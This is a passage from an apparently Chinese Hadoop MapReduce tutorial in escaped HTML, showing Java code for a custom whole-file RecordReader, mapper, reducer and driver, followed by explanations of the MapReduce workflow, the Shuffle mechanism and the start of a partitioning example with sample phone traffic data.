org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.InputSplit;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.RecordReader;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.TaskAttemptContext;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileSplit;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;WholeRecordReader&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;RecordReader&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; FileSplit split;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Configuration configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Text k = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Text();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; BytesWritable v = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; BytesWritable();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; isProgress = &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(InputSplit split, TaskAttemptContext context)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.split = (FileSplit) split;&lt;br/&gt;configuration = context.getConfiguration();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;nextKeyValue&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (isProgress) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;byte&lt;/span&gt;[] buf = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;byte&lt;/span&gt;[(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;) split.getLength()];&lt;/p&gt;&lt;p&gt;FileSystem fs = &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;;&lt;br/&gt;FSDataInputStream fis = &lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {&lt;br/&gt;Path path = split.getPath();&lt;br/&gt;fs = path.getFileSystem(configuration);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;fis = fs.open(path);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;IOUtils.readFully(fis, buf, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, buf.length);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;v.set(buf, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, buf.length);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;k.set(path.toString());&lt;/p&gt;&lt;p&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception e) {&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;finally&lt;/span&gt; {&lt;br/&gt;IOUtils.closeStream(fis);&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;isProgress = &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Text &lt;span class=&quot;hljs-title&quot;&gt;getCurrentKey&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; k;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; BytesWritable &lt;span class=&quot;hljs-title&quot;&gt;getCurrentValue&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; v;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;float&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getProgress&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;{&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（3）编写SequenceFileMapper类处理流程&lt;/p&gt;
&lt;pre readability=&quot;12.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;19&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.inputformat;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.BytesWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Mapper;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;SequenceFileMapper&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Mapper&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text key, BytesWritable value, Context context)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;context.write(key, value);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（4）编写SequenceFileReducer类处理流程&lt;/p&gt;
&lt;pre readability=&quot;12.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;19&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.inputformat;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.BytesWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Reducer;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;SequenceFileReducer&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Reducer&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;BytesWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;reduce&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text key, Iterable&amp;lt;BytesWritable&amp;gt; values,&lt;br/&gt;Context context)&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;throws&lt;/span&gt; IOException, InterruptedException &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (BytesWritable value : values) {&lt;br/&gt;context.write(key, value);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（5）编写SequenceFileDriver类处理流程&lt;/p&gt;
&lt;pre readability=&quot;20.5&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;35&quot;&gt;package com.atguigu.mr.inputformat;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.conf.Configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.BytesWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Job;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.output.SequenceFileOutputFormat;&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;SequenceFileDriver&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; main(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] args) throws IOException, Exception {&lt;br/&gt;args = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] { &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/input/inputself&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/output7&quot;&lt;/span&gt; };&lt;/p&gt;&lt;p&gt;&lt;br/&gt;Configuration conf = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Configuration();&lt;br/&gt;Job job = Job.getInstance(conf);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setJarByClass(SequenceFileDriver.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setMapperClass(SequenceFileMapper.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setReducerClass(SequenceFileReducer.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setInputFormatClass(WholeFileInputformat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setOutputFormatClass(SequenceFileOutputFormat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setMapOutputValueClass(BytesWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setOutputValueClass(BytesWritable.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;FileInputFormat.setInputPaths(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]));&lt;br/&gt;FileOutputFormat.setOutputPath(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]));&lt;/p&gt;&lt;p&gt;&lt;br/&gt;boolean result = job.waitForCompletion(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;System.exit(result ? &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; : &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h32mapreduce&quot;&gt;&lt;span&gt;&lt;strong&gt;3.2 MapReduce工作流程（面试重点）&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;1、流程示意图，如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6nTs.png&quot; alt=&quot;&quot;/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6E6S.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;2、流程详解&lt;br/&gt;  上面的流程是整个MapReduce最全工作流程，但是Shuffle过程只是从第7步开始到第16步结束，具体Shuffle过程详解，如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;1）MapTask收集我们的map()方法输出的kv对，放到内存缓冲区中。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;2）从内存缓冲区不断溢出本地磁盘文件，可能会溢出多个文件。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;3）多个溢出文件会被合并成大的溢出文件。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;4）在溢出过程及合并的过程中，都要调用Partitioner进行分区和针对key进行排序。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;5）ReduceTask根据自己的分区号，去各个MapTask机器上取相应的结果分区数据。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;6）ReduceTask会取到同一个分区的来自不同MapTask的结果文件，ReduceTask会将这些文件再进行合并（归并排序）。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;7）合并成大文件后，Shuffle的过程也就结束了，后面进入ReduceTask的逻辑运算过程（从文件中取出一个一个的键值对Group，调用用户自定义的reduce()方法）。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;3、注意&lt;br/&gt;  Shuffle中的缓冲区大小会影响到MapReduce程序的执行效率，原则上说，缓冲区越大，磁盘io的次数越少，执行速度就越快。&lt;br/&gt;  缓冲区的大小可以通过参数调整，参数：io.sort.mb默认100M。&lt;br/&gt;4、源码解析流程&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.write&lt;/span&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;k&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;NullWritable&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.get&lt;/span&gt;());&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.write&lt;/span&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;key&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;value&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;collector&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.collect&lt;/span&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;key&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;value&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;partitioner&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.getPartition&lt;/span&gt;(&lt;span class=&quot;hljs-selector-tag&quot;&gt;key&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;value&lt;/span&gt;, &lt;span class=&quot;hljs-selector-tag&quot;&gt;partitions&lt;/span&gt;));&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;HashPartitioner&lt;/span&gt;();&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;collect&lt;/span&gt;()&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;close&lt;/span&gt;()&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;collect&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.flush&lt;/span&gt;()&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;sortAndSpill&lt;/span&gt;()&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;sort&lt;/span&gt;()   &lt;span class=&quot;hljs-selector-tag&quot;&gt;QuickSort&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;mergeParts&lt;/span&gt;();&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.out&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.out&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.index&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;collector&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.close&lt;/span&gt;();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h33shuffle&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3 Shuffle机制（面试重点）&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h331shuffle&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.1 Shuffle机制&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;Map方法之后，Reduce方法之前的数据处理过程称之为Shuffle。如下图所示。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr686U.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h332partition&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.2 Partition分区&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6Ym4.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;自定义Partitioner分区步骤：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6MYq.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;分区总结：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/krckNR.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h333partition&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.3 Partition分区案例实操&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、需求&lt;br/&gt;  将统计结果按照手机归属地不同省份输出到不同文件中（分区）&lt;br/&gt;（1）输入数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs css&quot;&gt;1    13736230513 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.196&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.atguigu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 2481    24681   200&lt;br/&gt;2    13846544121 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.196&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.2&lt;/span&gt;                   264     0       200&lt;br/&gt;3     13956435636 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.196&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.3&lt;/span&gt;                   132     1512    200&lt;br/&gt;4     13966251146 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.1&lt;/span&gt;                   240     0       404&lt;br/&gt;5     18271575951 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.2&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.atguigu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 1527    2106    200&lt;br/&gt;6     84188413    192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.3&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.atguigu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 4116    1432    200&lt;br/&gt;7     13590439668 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.4&lt;/span&gt;                   1116    954     200&lt;br/&gt;8     15910133277 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.5&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.hao123&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;  3156    2936    200&lt;br/&gt;9     13729199489 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.6&lt;/span&gt;                   240     0       200&lt;br/&gt;10     13630577991 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.7&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.shouhu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;  6960    690     200&lt;br/&gt;11     15043685818 192&lt;span 